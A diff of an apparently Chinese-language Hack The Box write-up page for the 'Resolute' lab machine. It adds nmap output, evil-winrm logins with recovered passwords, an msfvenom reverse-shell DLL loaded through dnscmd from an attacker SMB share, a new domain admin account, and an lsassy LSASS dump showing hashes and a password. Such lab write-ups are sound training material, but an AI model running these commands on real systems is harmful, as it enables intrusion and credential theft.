@@ -11,14 +11,14 @@
         <link rel="canonical" href="https://Zer0-hex.github.io/write-up/HackTheBox/Machines/Resolute/">
       
       
-        <link rel="prev" href="../Netmon/">
+        <link rel="prev" href="../Reel/">
       
       
         <link rel="next" href="../Sau/">
       
       
       <link rel="icon" href="https://0.gravatar.com/avatar/436e8b6da13e17a08ed80d048a0135ff4db9e3b5d0f243f7f090a92a1db0dc98?size=512">
-      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.3">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.4">
     
     
       
@@ -932,6 +932,27 @@
                 
   
   
+  
+  
+    <li class="md-nav__item">
+      <a href="../Reel/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Reel
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
     
   
   
@@ -993,6 +1014,33 @@
   <a href="#shell-as-user-melanie" class="md-nav__link">
     <span class="md-ellipsis">
       Shell as User - melanie
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-user-ryan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as User - ryan
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as Root
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dump-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Dump Hash
     </span>
   </a>
   
@@ -1345,7 +1393,60 @@
 <blockquote>
 <p>export IP=10.10.10.169
 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code>
-<div class="language-shell highlight"><pre><span></span><code>
+<div class="language-shell highlight"><pre><span></span><code>PORT<span class="w">      </span>STATE<span class="w">  </span>SERVICE<span class="w">      </span>VERSION
+<span class="m">88</span>/tcp<span class="w">    </span>open<span class="w">   </span>kerberos-sec<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2024</span>-01-12<span class="w"> </span><span class="m">07</span>:55:38Z<span class="o">)</span>
+<span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">   </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">   </span>netbios-ssn<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
+<span class="m">389</span>/tcp<span class="w">   </span>open<span class="w">   </span>ldap<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>megabank.local,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">   </span>microsoft-ds<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Standard<span class="w"> </span><span class="m">14393</span><span class="w"> </span>microsoft-ds<span class="w"> </span><span class="o">(</span>workgroup:<span class="w"> </span>MEGABANK<span class="o">)</span>
+<span class="m">464</span>/tcp<span class="w">   </span>open<span class="w">   </span>kpasswd5?
+<span class="m">593</span>/tcp<span class="w">   </span>open<span class="w">   </span>ncacn_http<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<span class="m">636</span>/tcp<span class="w">   </span>open<span class="w">   </span>tcpwrapped
+<span class="m">3268</span>/tcp<span class="w">  </span>open<span class="w">   </span>ldap<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>megabank.local,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="m">3269</span>/tcp<span class="w">  </span>open<span class="w">   </span>tcpwrapped
+<span class="m">5985</span>/tcp<span class="w">  </span>open<span class="w">   </span>http<span class="w">         </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+<span class="m">9389</span>/tcp<span class="w">  </span>open<span class="w">   </span>mc-nmf<span class="w">       </span>.NET<span class="w"> </span>Message<span class="w"> </span>Framing
+<span class="m">47001</span>/tcp<span class="w"> </span>open<span class="w">   </span>http<span class="w">         </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+<span class="m">49664</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49665</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49666</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49667</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49671</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49678</span>/tcp<span class="w"> </span>open<span class="w">   </span>ncacn_http<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<span class="m">49679</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49684</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">49707</span>/tcp<span class="w"> </span>closed<span class="w"> </span>unknown
+No<span class="w"> </span>exact<span class="w"> </span>OS<span class="w"> </span>matches<span class="w"> </span><span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="o">(</span>If<span class="w"> </span>you<span class="w"> </span>know<span class="w"> </span>what<span class="w"> </span>OS<span class="w"> </span>is<span class="w"> </span>running<span class="w"> </span>on<span class="w"> </span>it,<span class="w"> </span>see<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span><span class="o">)</span>.
+TCP/IP<span class="w"> </span>fingerprint:
+...
+Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">2</span><span class="w"> </span>hops
+Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>RESOLUTE<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
+
+Host<span class="w"> </span>script<span class="w"> </span>results:
+<span class="p">|</span><span class="w"> </span>smb-os-discovery:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>OS:<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Standard<span class="w"> </span><span class="m">14393</span><span class="w"> </span><span class="o">(</span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Standard<span class="w"> </span><span class="m">6</span>.3<span class="o">)</span>
+<span class="p">|</span><span class="w">   </span>Computer<span class="w"> </span>name:<span class="w"> </span>Resolute
+<span class="p">|</span><span class="w">   </span>NetBIOS<span class="w"> </span>computer<span class="w"> </span>name:<span class="w"> </span>RESOLUTE<span class="se">\x</span><span class="m">00</span>
+<span class="p">|</span><span class="w">   </span>Domain<span class="w"> </span>name:<span class="w"> </span>megabank.local
+<span class="p">|</span><span class="w">   </span>Forest<span class="w"> </span>name:<span class="w"> </span>megabank.local
+<span class="p">|</span><span class="w">   </span>FQDN:<span class="w"> </span>Resolute.megabank.local
+<span class="p">|</span>_<span class="w">  </span>System<span class="w"> </span>time:<span class="w"> </span><span class="m">2024</span>-01-11T23:56:51-08:00
+<span class="p">|</span><span class="w"> </span>smb-security-mode:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>account_used:<span class="w"> </span>&lt;blank&gt;
+<span class="p">|</span><span class="w">   </span>authentication_level:<span class="w"> </span>user
+<span class="p">|</span><span class="w">   </span>challenge_response:<span class="w"> </span>supported
+<span class="p">|</span>_<span class="w">  </span>message_signing:<span class="w"> </span>required
+<span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span><span class="m">3</span>:1:1:<span class="w"> </span>
+<span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
+<span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2024</span>-01-12T07:56:52
+<span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span><span class="m">2024</span>-01-12T07:52:54
+<span class="p">|</span>_clock-skew:<span class="w"> </span>mean:<span class="w"> </span>2h47m00s,<span class="w"> </span>deviation:<span class="w"> </span>4h37m09s,<span class="w"> </span>median:<span class="w"> </span>6m59s
 </code></pre></div>
 - <code>crackmapexec smb $IP -u guest -p '' --shares</code>
 <img alt="" src="../assets/Pasted%20image%2020240112155414.png" />
@@ -1402,7 +1503,46 @@ badPasswordTime:<span class="w"> </span><span class="m">0</span>
 <img alt="" src="../assets/Pasted%20image%2020240112165901.png" /></li>
 <li><code>evil-winrm -i $IP -u 'melanie' -p 'Welcome123!'</code>
 <img alt="" src="../assets/Pasted%20image%2020240112170759.png" /></li>
-<li>遛狗</li>
+</ul>
+<h2 id="shell-as-user-ryan">Shell as User - ryan</h2>
+<ul>
+<li>遛狗，发现这个用户没啥权限
+<img alt="" src="../assets/Pasted%20image%2020240115160729.png" /></li>
+<li>跑一下 WinPeas 没有可利用的信息</li>
+<li>查看本地文件，发现 PSTranscripts 目录
+<img alt="" src="../assets/Pasted%20image%2020240115163133.png" /></li>
+<li>发现 ryan 用户凭据
+<img alt="" src="../assets/Pasted%20image%2020240115163302.png" /></li>
+<li><code>evil-winrm -i $IP -u ryan -p 'Serv3r4Admin4cc123!'</code>
+<img alt="" src="../assets/Pasted%20image%2020240115163523.png" /></li>
+<li>发现此用户为 DNS 管理员
+<img alt="" src="../assets/Pasted%20image%2020240115160954.png" /></li>
+</ul>
+<h2 id="shell-as-root">Shell as Root</h2>
+<p>ryan 是 DNS 管理员，因此可以使用 dnscmd.exe 指定应由 DNS 加载的插件 DLL 反弹 Shell
+- 生成 reverse shell dll 文件 <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.18 LPORT=2233 -f dll -o good.dll</code>
+- 启动 smb 服务
+<img alt="" src="../assets/Pasted%20image%2020240115170345.png" />
+- 利用 dnscmd.exe 加载 good.dll，重启服务获取 shell
+<div class="language-shell highlight"><pre><span></span><code>dnscmd.exe<span class="w"> </span>localhost<span class="w"> </span>/config<span class="w"> </span>/serverlevelplugindll<span class="w"> </span><span class="se">\\</span><span class="m">10</span>.10.16.18<span class="se">\g</span>ood<span class="se">\g</span>ood.dll
+sc.exe<span class="w"> </span>stop<span class="w"> </span>dns
+sc.exe<span class="w"> </span>start<span class="w"> </span>dns
+</code></pre></div>
+<img alt="" src="../assets/Pasted%20image%2020240115170425.png" /></p>
+<h2 id="dump-hash">Dump Hash</h2>
+<ul>
+<li>添加域管
+<div class="language-shell highlight"><pre><span></span><code>net<span class="w"> </span>user<span class="w"> </span>newboy<span class="w"> </span>Admin@123<span class="w"> </span>/add<span class="w"> </span>/domain
+net<span class="w"> </span>group<span class="w"> </span><span class="s2">&quot;domain admins&quot;</span><span class="w"> </span>newboy<span class="w"> </span>/add<span class="w"> </span>/domain
+</code></pre></div></li>
+<li><code>lsassy megabank.local -u newboy -p 'Admin@123' -dc-ip $IP</code>
+<div class="language-shell highlight"><pre><span></span><code><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>megabank.local<span class="w"> </span>Authentication<span class="w"> </span>successful
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>megabank.local<span class="w"> </span>Lsass<span class="w"> </span>dumped<span class="w"> </span><span class="k">in</span><span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\j</span>Y2.sys<span class="w"> </span><span class="o">(</span><span class="m">148886946</span><span class="w"> </span>Bytes<span class="o">)</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>megabank.local<span class="w"> </span>Lsass<span class="w"> </span>dump<span class="w"> </span>deleted
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>megabank.local<span class="w"> </span>MEGABANK<span class="se">\R</span>ESOLUTE$<span class="w">            </span><span class="o">[</span>NT<span class="o">]</span><span class="w"> </span>84ab27f4fa73cd812c44dd4f3c141f6c<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">[</span>SHA1<span class="o">]</span><span class="w"> </span>a1bb1366976dc62859f90e015ded4509cb2c46cc
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>megabank.local<span class="w"> </span>MEGABANK<span class="se">\A</span>dministrator<span class="w">        </span><span class="o">[</span>NT<span class="o">]</span><span class="w"> </span>fb3b106896cdaa8a08072775fbd9afe9<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">[</span>SHA1<span class="o">]</span><span class="w"> </span>03006b77aacca0a1e25f4134c6e2f1ef13a82a19
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>megabank.local<span class="w"> </span>megabank.local<span class="se">\A</span>dministrator<span class="w">  </span><span class="o">[</span>PWD<span class="o">]</span><span class="w"> </span>DontH4ckUsPleeze!
+</code></pre></div></li>
 </ul>
 
 
@@ -1458,10 +1598,10 @@ badPasswordTime:<span class="w"> </span><span class="m">0</span>
       <div class="md-progress" data-md-component="progress" role="progressbar"></div>
     
     
-    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.expand", "navigation.path", "navigation.top", "toc.follow", "toc.integrate", "navigation.instant", "navigation.instant.progress", "header.autohide"], "search": "../../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.expand", "navigation.path", "navigation.top", "toc.follow", "toc.integrate", "navigation.instant", "navigation.instant.progress", "header.autohide"], "search": "../../../assets/javascripts/workers/search.c011b7c0.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.d7c377c4.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.7389ff0e.min.js"></script>
       
     
   </body>
